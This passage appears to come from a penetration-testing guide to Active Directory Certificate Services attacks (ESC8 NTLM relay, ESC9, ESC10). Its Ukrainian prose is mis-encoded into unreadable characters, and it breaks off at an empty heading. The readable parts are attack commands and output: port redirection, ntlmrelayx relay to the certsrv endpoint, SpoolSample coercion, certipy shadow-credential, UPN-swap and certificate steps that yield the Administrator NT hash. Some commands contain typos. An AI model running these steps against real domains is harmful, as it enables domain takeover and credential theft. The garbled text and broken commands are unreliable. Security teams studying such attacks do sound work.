* **–Ü–Ω—Ç–µ—Ä—Ñ–µ–π—Å –≤–µ–±-—Ä–µ—î—Å—Ç—Ä–∞—Ü—ñ—ó** (—Å—Ç–∞—Ä–æ–¥–∞–≤–Ω—è ASP-–¥–æ–¥–∞—Ç–æ–∫, –¥–æ—Å—Ç—É–ø–Ω–∏–π –∑–∞ –∞–¥—Ä–µ—Å–æ—é `http://<caserver>/certsrv/`), –∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î –ª–∏—à–µ HTTP, —â–æ –Ω–µ –∑–∞–±–µ–∑–ø–µ—á—É—î –∑–∞—Ö–∏—Å—Ç –≤—ñ–¥ –∞—Ç–∞–∫ –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–Ω—è NTLM. –ö—Ä—ñ–º —Ç–æ–≥–æ, –≤—ñ–Ω —è–≤–Ω–æ –¥–æ–∑–≤–æ–ª—è—î –ª–∏—à–µ –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—é NTLM —á–µ—Ä–µ–∑ —Å–≤—ñ–π –∑–∞–≥–æ–ª–æ–≤–æ–∫ HTTP –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü—ñ—ó, —â–æ —Ä–æ–±–∏—Ç—å –±—ñ–ª—å—à –±–µ–∑–ø–µ—á–Ω—ñ –º–µ—Ç–æ–¥–∏ –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó, —Ç–∞–∫—ñ —è–∫ Kerberos, –Ω–µ–ø—Ä–∏–¥–∞—Ç–Ω–∏–º–∏.
* **–°–ª—É–∂–±–∞ —Ä–µ—î—Å—Ç—Ä–∞—Ü—ñ—ó —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç—ñ–≤** (CES), **–°–ª—É–∂–±–∞ –ø–æ–ª—ñ—Ç–∏–∫–∏ —Ä–µ—î—Å—Ç—Ä–∞—Ü—ñ—ó —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç—ñ–≤** (CEP) —Ç–∞ **–°–ª—É–∂–±–∞ —Ä–µ—î—Å—Ç—Ä–∞—Ü—ñ—ó –º–µ—Ä–µ–∂–µ–≤–∏—Ö –ø—Ä–∏—Å—Ç—Ä–æ—ó–≤** (NDES) –∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º –ø—ñ–¥—Ç—Ä–∏–º—É—é—Ç—å –ø–µ—Ä–µ–≥–æ–≤–æ—Ä–Ω—É –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—é —á–µ—Ä–µ–∑ —Å–≤—ñ–π –∑–∞–≥–æ–ª–æ–≤–æ–∫ HTTP –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü—ñ—ó. –ü–µ—Ä–µ–≥–æ–≤–æ—Ä–Ω–∞ –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—è **–ø—ñ–¥—Ç—Ä–∏–º—É—î —è–∫** Kerberos, —Ç–∞–∫ —ñ **NTLM**, –¥–æ–∑–≤–æ–ª—è—é—á–∏ –∞—Ç–∞–∫—É—é—á–æ–º—É **–∑–Ω–∏–∑–∏—Ç–∏ —Ä—ñ–≤–µ–Ω—å –¥–æ –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó NTLM** –ø—ñ–¥ —á–∞—Å –∞—Ç–∞–∫ –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–Ω—è. –•–æ—á–∞ —Ü—ñ –≤–µ–±-—Å–µ—Ä–≤—ñ—Å–∏ –∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º –ø—ñ–¥—Ç—Ä–∏–º—É—é—Ç—å HTTPS, —Å–∞–º–µ HTTPS **–Ω–µ –∑–∞—Ö–∏—â–∞—î –≤—ñ–¥ –∞—Ç–∞–∫ –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–Ω—è NTLM**. –ó–∞—Ö–∏—Å—Ç –≤—ñ–¥ –∞—Ç–∞–∫ –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–Ω—è NTLM –¥–ª—è —Å–ª—É–∂–± HTTPS –º–æ–∂–ª–∏–≤–∏–π –ª–∏—à–µ —Ç–æ–¥—ñ, –∫–æ–ª–∏ HTTPS –ø–æ—î–¥–Ω–∞–Ω–æ –∑ –ø—Ä–∏–≤'—è–∑–∫–æ—é –∫–∞–Ω–∞–ª—É. –ù–∞ –∂–∞–ª—å, AD CS –Ω–µ –∞–∫—Ç–∏–≤—É—î –†–æ–∑—à–∏—Ä–µ–Ω—É –∑–∞—Ö–∏—Å—Ç –¥–ª—è –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó –Ω–∞ IIS, —è–∫–∞ –Ω–µ–æ–±—Ö—ñ–¥–Ω–∞ –¥–ª—è –ø—Ä–∏–≤'—è–∑–∫–∏ –∫–∞–Ω–∞–ª—É.

–û–¥–Ω—ñ—î—é –∑—ñ —Å–ø—ñ–ª—å–Ω–∏—Ö **–ø—Ä–æ–±–ª–µ–º** –∑ –∞—Ç–∞–∫–∞–º–∏ –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–Ω—è NTLM —î **–∫–æ—Ä–æ—Ç–∫–∏–π —Ç–µ—Ä–º—ñ–Ω —Å–µ—Å—ñ–π NTLM** —Ç–∞ –Ω–µ–º–æ–∂–ª–∏–≤—ñ—Å—Ç—å –∞—Ç–∞–∫—É—é—á–æ–≥–æ –≤–∑–∞—î–º–æ–¥—ñ—è—Ç–∏ –∑ —Å–µ—Ä–≤—ñ—Å–∞–º–∏, —è–∫—ñ **–≤–∏–º–∞–≥–∞—é—Ç—å –ø—ñ–¥–ø–∏—Å—É NTLM**.

–¢–∏–º –Ω–µ –º–µ–Ω—à, —Ü–µ –æ–±–º–µ–∂–µ–Ω–Ω—è –ø–æ–¥–æ–ª–∞–Ω–æ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –∞—Ç–∞–∫–∏ –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–Ω—è NTLM –¥–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç–∞ –¥–ª—è –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞, –æ—Å–∫—ñ–ª—å–∫–∏ —Ç–µ—Ä–º—ñ–Ω –¥—ñ—ó —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç–∞ –≤–∏–∑–Ω–∞—á–∞—î —Ç—Ä–∏–≤–∞–ª—ñ—Å—Ç—å —Å–µ—Å—ñ—ó, —ñ —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç –º–æ–∂–µ –±—É—Ç–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–∏–π –∑ —Å–µ—Ä–≤—ñ—Å–∞–º–∏, —è–∫—ñ **–≤–∏–º–∞–≥–∞—é—Ç—å –ø—ñ–¥–ø–∏—Å—É NTLM**. –©–æ–± –æ—Ç—Ä–∏–º–∞—Ç–∏ —ñ–Ω—Å—Ç—Ä—É–∫—Ü—ñ—ó –∑ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è–º –≤–∫—Ä–∞–¥–µ–Ω–æ–≥–æ —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç–∞, –¥–∏–≤.:

{% content-ref url="account-persistence.md" %}
[account-persistence.md](account-persistence.md)
{% endcontent-ref %}

–©–µ –æ–¥–Ω–∏–º –æ–±–º–µ–∂–µ–Ω–Ω—è–º –∞—Ç–∞–∫ –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–Ω—è NTLM —î —Ç–µ, —â–æ **–∫–æ–º–ø'—é—Ç–µ—Ä, –ø—ñ–¥–∫–æ–Ω—Ç—Ä–æ–ª—å–Ω–∏–π –∞—Ç–∞–∫—É—é—á–æ–º—É, –ø–æ–≤–∏–Ω–µ–Ω –±—É—Ç–∏ –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–æ–≤–∞–Ω–∏–π –æ–±–ª—ñ–∫–æ–≤–∏–º –∑–∞–ø–∏—Å–æ–º –∂–µ—Ä—Ç–≤–∏**. –ê—Ç–∞–∫—É—é—á–∏–π –º–æ–∂–µ —á–µ–∫–∞—Ç–∏ –∞–±–æ —Å–ø—Ä–æ–±—É–≤–∞—Ç–∏ **–ø—Ä–∏–º—É—Å–∏—Ç–∏** —Ü—é –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—é:

{% content-ref url="../printers-spooler-service-abuse.md" %}
[printers-spooler-service-abuse.md](../printers-spooler-service-abuse.md)
{% endcontent-ref %}

### **–ó–ª–æ–≤–∂–∏–≤–∞–Ω–Ω—è**

[**Certify**](https://github.com/GhostPack/Certify) `cas` –ø–µ—Ä–µ—Ä–∞—Ö–æ–≤—É—î **—É–≤—ñ–º–∫–Ω–µ–Ω—ñ HTTP-—Ç–æ—á–∫–∏ –¥–æ—Å—Ç—É–ø—É AD CS**:
```
Certify.exe cas
```
<figure><img src="../../../.gitbook/assets/image (6) (1) (2).png" alt=""><figcaption></figcaption></figure>

–í–ª–∞—Å—Ç–∏–≤—ñ—Å—Ç—å `msPKI-Enrollment-Servers` –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –∫–æ—Ä–ø–æ—Ä–∞—Ç–∏–≤–Ω–∏–º–∏ —Ü–µ–Ω—Ç—Ä–∞–º–∏ —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó (CAs) –¥–ª—è –∑–±–µ—Ä—ñ–≥–∞–Ω–Ω—è –∫—ñ–Ω—Ü–µ–≤–∏—Ö —Ç–æ—á–æ–∫ —Å–ª—É–∂–±–∏ —Ä–µ—î—Å—Ç—Ä–∞—Ü—ñ—ó —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç—ñ–≤ (CES). –¶—ñ –∫—ñ–Ω—Ü–µ–≤—ñ —Ç–æ—á–∫–∏ –º–æ–∂–Ω–∞ —Ä–æ–∑—ñ–±—Ä–∞—Ç–∏ —Ç–∞ –ø–µ—Ä–µ—Ä–∞—Ö—É–≤–∞—Ç–∏, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç **Certutil.exe**:
```
certutil.exe -enrollmentServerURL -config DC01.DOMAIN.LOCAL\DOMAIN-CA
```
<figure><img src="../../../.gitbook/assets/image (2) (2) (2) (1).png" alt=""><figcaption></figcaption></figure>
```powershell
Import-Module PSPKI
Get-CertificationAuthority | select Name,Enroll* | Format-List *
```
<figure><img src="../../../.gitbook/assets/image (8) (2) (2).png" alt=""><figcaption></figcaption></figure>

#### –ó–ª–æ–≤–∂–∏–≤–∞–Ω–Ω—è Certify
```bash
## In the victim machine
# Prepare to send traffic to the compromised machine 445 port to 445 in the attackers machine
PortBender redirect 445 8445
rportfwd 8445 127.0.0.1 445
# Prepare a proxy that the attacker can use
socks 1080

## In the attackers
proxychains ntlmrelayx.py -t http://<AC Server IP>/certsrv/certfnsh.asp -smb2support --adcs --no-http-server

# Force authentication from victim to compromised machine with port forwards
execute-assembly C:\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe <victim> <compromised>
```
#### –ó–ª–æ–≤–∂–∏–≤–∞–Ω–Ω—è –∑ [Certipy](https://github.com/ly4k/Certipy)

–ó–∞–ø–∏—Ç –Ω–∞ –æ—Ç—Ä–∏–º–∞–Ω–Ω—è —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç–∞ –∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º –≤–∏–∫–æ–Ω—É—î—Ç—å—Å—è Certipy –Ω–∞ –æ—Å–Ω–æ–≤—ñ —à–∞–±–ª–æ–Ω—É `Machine` –∞–±–æ `User`, –≤–∏–∑–Ω–∞—á–µ–Ω–æ–≥–æ –∑–∞–ª–µ–∂–Ω–æ –≤—ñ–¥ —Ç–æ–≥–æ, –∑–∞–∫—ñ–Ω—á—É—î—Ç—å—Å—è —á–∏ –Ω–µ —ñ–º'—è –æ–±–ª—ñ–∫–æ–≤–æ–≥–æ –∑–∞–ø–∏—Å—É –Ω–∞ `$`. –í–∫–∞–∑–∞–Ω–Ω—è –∞–ª—å—Ç–µ—Ä–Ω–∞—Ç–∏–≤–Ω–æ–≥–æ —à–∞–±–ª–æ–Ω—É –º–æ–∂–ª–∏–≤–æ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –ø–∞—Ä–∞–º–µ—Ç—Ä–∞ `-template`.

–¢–µ—Ö–Ω—ñ–∫–∞, –ø–æ–¥—ñ–±–Ω–∞ –¥–æ [PetitPotam](https://github.com/ly4k/PetitPotam), –º–æ–∂–µ –±—É—Ç–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–∞ –¥–ª—è –ø—Ä–∏–º—É—Å–æ–≤–æ—ó –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó. –ü—Ä–∏ —Ä–æ–±–æ—Ç—ñ –∑ –∫–æ–Ω—Ç—Ä–æ–ª–µ—Ä–∞–º–∏ –¥–æ–º–µ–Ω—É, –Ω–µ–æ–±—Ö—ñ–¥–Ω–æ –≤–∫–∞–∑–∞—Ç–∏ `-template DomainController`.
```bash
certipy relay -ca ca.corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Targeting http://ca.corp.local/certsrv/certfnsh.asp
[*] Listening on 0.0.0.0:445
[*] Requesting certificate for 'CORP\\Administrator' based on the template 'User'
[*] Got certificate with UPN 'Administrator@corp.local'
[*] Certificate object SID is 'S-1-5-21-980154951-4172460254-2779440654-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
## –ù–µ–º–∞—î —Ä–æ–∑—à–∏—Ä–µ–Ω–Ω—è –±–µ–∑–ø–µ–∫–∏ - ESC9 <a href="#5485" id="5485"></a>

### –ü–æ—è—Å–Ω–µ–Ω–Ω—è

–ù–æ–≤–µ –∑–Ω–∞—á–µ–Ω–Ω—è **`CT_FLAG_NO_SECURITY_EXTENSION`** (`0x80000`) –¥–ª—è **`msPKI-Enrollment-Flag`**, –≤—ñ–¥–æ–º–µ —è–∫ ESC9, –∑–∞–ø–æ–±—ñ–≥–∞—î –≤–±—É–¥–æ–≤—É–≤–∞–Ω–Ω—é **–Ω–æ–≤–æ–≥–æ —Ä–æ–∑—à–∏—Ä–µ–Ω–Ω—è –±–µ–∑–ø–µ–∫–∏ `szOID_NTDS_CA_SECURITY_EXT`** –≤ —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç. –¶–µ–π –ø—Ä–∞–ø–æ—Ä —Å—Ç–∞—î –≤–∞–∂–ª–∏–≤–∏–º, –∫–æ–ª–∏ `StrongCertificateBindingEnforcement` –≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–æ –Ω–∞ `1` (–∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º), —â–æ –≤—ñ–¥—Ä—ñ–∑–Ω—è—î—Ç—å—Å—è –≤—ñ–¥ –Ω–∞–ª–∞—à—Ç—É–≤–∞–Ω–Ω—è `2`. –ô–æ–≥–æ –∑–Ω–∞—á–µ–Ω–Ω—è –ø—ñ–¥–≤–∏—â—É—î—Ç—å—Å—è –≤ —Å—Ü–µ–Ω–∞—Ä—ñ—è—Ö, –¥–µ –º–æ–∂–µ –±—É—Ç–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–æ —Å–ª–∞–±–∫–µ –≤—ñ–¥–æ–±—Ä–∞–∂–µ–Ω–Ω—è —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç—ñ–≤ –¥–ª—è Kerberos –∞–±–æ Schannel (—è–∫ —É ESC10), –æ—Å–∫—ñ–ª—å–∫–∏ –≤—ñ–¥—Å—É—Ç–Ω—ñ—Å—Ç—å ESC9 –Ω–µ –∑–º—ñ–Ω–∏–ª–∞ –± –≤–∏–º–æ–≥.

–£–º–æ–≤–∏, –ø—Ä–∏ —è–∫–∏—Ö –Ω–∞–ª–∞—à—Ç—É–≤–∞–Ω–Ω—è —Ü—å–æ–≥–æ –ø—Ä–∞–ø–æ—Ä—Ü—è —Å—Ç–∞—î –∑–Ω–∞—á—É—â–∏–º, –≤–∫–ª—é—á–∞—é—Ç—å:
- `StrongCertificateBindingEnforcement` –Ω–µ –Ω–∞–ª–∞—à—Ç–æ–≤–∞–Ω–æ –Ω–∞ `2` (–∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º –Ω–∞–ª–∞—à—Ç—É–≤–∞–Ω–Ω—è `1`), –∞–±–æ `CertificateMappingMethods` –≤–∫–ª—é—á–∞—î –ø—Ä–∞–ø–æ—Ä–µ—Ü—å `UPN`.
- –°–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç –ø–æ–∑–Ω–∞—á–µ–Ω–∏–π –ø—Ä–∞–ø–æ—Ä—Ü–µ–º `CT_FLAG_NO_SECURITY_EXTENSION` –≤ –Ω–∞–ª–∞—à—Ç—É–≤–∞–Ω–Ω—ñ `msPKI-Enrollment-Flag`.
- –°–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç –≤–∫–∞–∑—É—î –±—É–¥—å-—è–∫—É EKU –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó –∫–ª—ñ—î–Ω—Ç–∞.
- –Ñ –¥–æ—Å—Ç—É–ø –¥–æ `GenericWrite` –¥–æ–∑–≤–æ–ª—ñ–≤ –Ω–∞ –±—É–¥—å-—è–∫–∏–π –æ–±–ª—ñ–∫–æ–≤–∏–π –∑–∞–ø–∏—Å –¥–ª—è –∫–æ–º–ø—Ä–æ–º–µ—Ç–∞—Ü—ñ—ó —ñ–Ω—à–æ–≥–æ.

### –°—Ü–µ–Ω–∞—Ä—ñ–π –∑–ª–æ–≤–∂–∏–≤–∞–Ω–Ω—è

–ü—Ä–∏–ø—É—Å—Ç–∏–º–æ, —â–æ `John@corp.local` –º–∞—î –¥–æ–∑–≤—ñ–ª `GenericWrite` –Ω–∞ `Jane@corp.local`, –∑ –º–µ—Ç–æ—é –∫–æ–º–ø—Ä–æ–º–µ—Ç–∞—Ü—ñ—ó `Administrator@corp.local`. –®–∞–±–ª–æ–Ω —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç–∞ `ESC9`, –≤ —è–∫–∏–π –º–∞—î –ø—Ä–∞–≤–æ –∑–∞–ø–∏—Å—É–≤–∞—Ç–∏—Å—è `Jane@corp.local`, –Ω–∞–ª–∞—à—Ç–æ–≤–∞–Ω–∏–π –∑ –ø—Ä–∞–ø–æ—Ä—Ü–µ–º `CT_FLAG_NO_SECURITY_EXTENSION` –≤ –Ω–∞–ª–∞—à—Ç—É–≤–∞–Ω–Ω—ñ `msPKI-Enrollment-Flag`.

–°–ø–æ—á–∞—Ç–∫—É —Ö–µ—à `Jane` –æ—Ç—Ä–∏–º—É—î—Ç—å—Å—è –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é —Ç—ñ–Ω—å–æ–≤–∏—Ö –æ–±–ª—ñ–∫–æ–≤–∏—Ö –¥–∞–Ω–∏—Ö, –∑–∞–≤–¥—è–∫–∏ `GenericWrite` `John`:
```bash
certipy shadow auto -username John@corp.local -password Passw0rd! -account Jane
```
–ü—ñ–∑–Ω—ñ—à–µ `userPrincipalName` `Jane` –∑–º—ñ–Ω–µ–Ω–æ –Ω–∞ `Administrator`, —É—Å–≤—ñ–¥–æ–º–ª–µ–Ω–æ –ø—Ä–æ–ø—É—Å–∫–∞—é—á–∏ —á–∞—Å—Ç–∏–Ω—É –¥–æ–º–µ–Ω—É `@corp.local`:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
–¶—è –º–æ–¥–∏—Ñ—ñ–∫–∞—Ü—ñ—è –Ω–µ –ø–æ—Ä—É—à—É—î –æ–±–º–µ–∂–µ–Ω—å, –æ—Å–∫—ñ–ª—å–∫–∏ `Administrator@corp.local` –∑–∞–ª–∏—à–∞—î—Ç—å—Å—è –≤—ñ–¥–º—ñ–Ω–Ω–∏–º —è–∫ `userPrincipalName` `Administrator`.

–ü—ñ—Å–ª—è —Ü—å–æ–≥–æ, —à–∞–±–ª–æ–Ω —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç–∞ `ESC9`, –ø–æ–∑–Ω–∞—á–µ–Ω–∏–π —è–∫ –≤—Ä–∞–∑–ª–∏–≤–∏–π, –∑–∞–ø–∏—Ç—É—î—Ç—å—Å—è —è–∫ `Jane`:
```bash
certipy req -username jane@corp.local -hashes <hash> -ca corp-DC-CA -template ESC9
```
–¶–µ –∑–∞—É–≤–∞–∂–µ–Ω–æ, —â–æ `userPrincipalName` —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç–∞ –≤—ñ–¥–æ–±—Ä–∞–∂–∞—î `Administrator`, –ø–æ–∑–±–∞–≤–ª–µ–Ω–∏–π –±—É–¥—å-—è–∫–æ–≥–æ "object SID".

`userPrincipalName` `Jane` –ø–æ—Ç—ñ–º –ø–æ–≤–µ—Ä—Ç–∞—î—Ç—å—Å—è –¥–æ —ó—ó –æ—Ä–∏–≥—ñ–Ω–∞–ª—å–Ω–æ–≥–æ –∑–Ω–∞—á–µ–Ω–Ω—è, `Jane@corp.local`:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
–°–ø—Ä–æ–±–∞ –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –≤–∏–¥–∞–Ω–æ–≥–æ —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç–∞ —Ç–µ–ø–µ—Ä –≤–∏–¥–∞—î NT-—Ö–µ—à `Administrator@corp.local`. –ö–æ–º–∞–Ω–¥–∞ –ø–æ–≤–∏–Ω–Ω–∞ –≤–∫–ª—é—á–∞—Ç–∏ `-domain <domain>`, –æ—Å–∫—ñ–ª—å–∫–∏ –≤ —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç—ñ –≤—ñ–¥—Å—É—Ç–Ω—è —Å–ø–µ—Ü–∏—Ñ—ñ–∫–∞—Ü—ñ—è –¥–æ–º–µ–Ω—É:
```bash
certipy auth -pfx adminitrator.pfx -domain corp.local
```
## –°–ª–∞–±–∫—ñ –≤—ñ–¥–æ–±—Ä–∞–∂–µ–Ω–Ω—è —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç—ñ–≤ - ESC10

### –ü–æ—è—Å–Ω–µ–Ω–Ω—è

–î–≤–∞ –∑–Ω–∞—á–µ–Ω–Ω—è –∫–ª—é—á—ñ–≤ —Ä–µ—î—Å—Ç—Ä—É –Ω–∞ –∫–æ–Ω—Ç—Ä–æ–ª–µ—Ä—ñ –¥–æ–º–µ–Ω—É –∑–≥–∞–¥—É—é—Ç—å—Å—è ESC10:

- –ó–Ω–∞—á–µ–Ω–Ω—è –∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º –¥–ª—è `CertificateMappingMethods` –ø—ñ–¥ `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel` - `0x18` (`0x8 | 0x10`), —Ä–∞–Ω—ñ—à–µ –≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–µ –Ω–∞ `0x1F`.
- –ù–∞–ª–∞—à—Ç—É–≤–∞–Ω–Ω—è –∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º –¥–ª—è `StrongCertificateBindingEnforcement` –ø—ñ–¥ `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc` - `1`, —Ä–∞–Ω—ñ—à–µ `0`.

**–°—Ü–µ–Ω–∞—Ä—ñ–π 1**

–ö–æ–ª–∏ `StrongCertificateBindingEnforcement` –Ω–∞–ª–∞—à—Ç–æ–≤–∞–Ω–æ —è–∫ `0`.

**–°—Ü–µ–Ω–∞—Ä—ñ–π 2**

–Ø–∫—â–æ `CertificateMappingMethods` –≤–∫–ª—é—á–∞—î –±—ñ—Ç `UPN` (`0x4`).

### –í–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è —É –≤–∏–ø–∞–¥–∫—É 1

–ó `StrongCertificateBindingEnforcement` –Ω–∞–ª–∞—à—Ç–æ–≤–∞–Ω–∏–º —è–∫ `0`, –æ–±–ª—ñ–∫–æ–≤–∏–π –∑–∞–ø–∏—Å A –∑ –¥–æ–∑–≤–æ–ª–∞–º–∏ `GenericWrite` –º–æ–∂–µ –±—É—Ç–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–∏–π –¥–ª—è –∫–æ–º–ø—Ä–æ–º–µ—Ç–∞—Ü—ñ—ó –±—É–¥—å-—è–∫–æ–≥–æ –æ–±–ª—ñ–∫–æ–≤–æ–≥–æ –∑–∞–ø–∏—Å—É B.

–ù–∞–ø—Ä–∏–∫–ª–∞–¥, –º–∞—é—á–∏ –¥–æ–∑–≤–æ–ª–∏ `GenericWrite` –Ω–∞ `Jane@corp.local`, –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫ –º–∞—î –Ω–∞ –º–µ—Ç—ñ –∫–æ–º–ø—Ä–æ–º–µ—Ç—É–≤–∞—Ç–∏ `Administrator@corp.local`. –ü—Ä–æ—Ü–µ–¥—É—Ä–∞ –≤—ñ–¥–æ–±—Ä–∞–∂–∞—î ESC9, –¥–æ–∑–≤–æ–ª—è—é—á–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –±—É–¥—å-—è–∫–∏–π —à–∞–±–ª–æ–Ω —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç–∞.

–°–ø–æ—á–∞—Ç–∫—É —Ö–µ—à `Jane` –æ—Ç—Ä–∏–º—É—î—Ç—å—Å—è –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é Shadow Credentials, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ `GenericWrite`.
```bash
certipy shadow autho -username John@corp.local -p Passw0rd! -a Jane
```
–ü—ñ–∑–Ω—ñ—à–µ `userPrincipalName` `Jane` –∑–º—ñ–Ω–µ–Ω–æ –Ω–∞ `Administrator`, —Å–≤—ñ–¥–æ–º–æ –ø—Ä–æ–ø—É—Å—Ç–∏–≤—à–∏ —á–∞—Å—Ç–∏–Ω—É `@corp.local`, —â–æ–± —É–Ω–∏–∫–Ω—É—Ç–∏ –ø–æ—Ä—É—à–µ–Ω–Ω—è –æ–±–º–µ–∂–µ–Ω—å.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
–ü—ñ—Å–ª—è —Ü—å–æ–≥–æ –∑–∞–ø–∏—Ç—É—î—Ç—å—Å—è —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç, —è–∫–∏–π –¥–æ–∑–≤–æ–ª—è—î –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—é –∫–ª—ñ—î–Ω—Ç–∞ —è–∫ `Jane`, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ —Ç–∏–ø–æ–≤–∏–π —à–∞–±–ª–æ–Ω `User`.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
`userPrincipalName` –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ `Jane` –ø–æ—Ç—ñ–º –ø–æ–≤–µ—Ä—Ç–∞—î—Ç—å—Å—è –¥–æ —Å–≤–æ–≥–æ –æ—Ä–∏–≥—ñ–Ω–∞–ª—É, `Jane@corp.local`.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
–ê—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—è –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –æ—Ç—Ä–∏–º–∞–Ω–æ–≥–æ —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç–∞ –≤–∏–≤–µ–¥–µ NT-—Ö–µ—à `Administrator@corp.local`, —â–æ –≤–∏–º–∞–≥–∞—î –≤–∫–∞–∑–∞–Ω–Ω—è –¥–æ–º–µ–Ω—É –≤ –∫–æ–º–∞–Ω–¥—ñ —á–µ—Ä–µ–∑ –≤—ñ–¥—Å—É—Ç–Ω—ñ—Å—Ç—å –¥–µ—Ç–∞–ª–µ–π –¥–æ–º–µ–Ω—É –≤ —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç—ñ.
```bash
certipy auth -pfx administrator.pfx -domain corp.local
```
### –í–∏–ø–∞–¥–æ–∫ –∑–ª–æ–≤–∂–∏–≤–∞–Ω–Ω—è 2

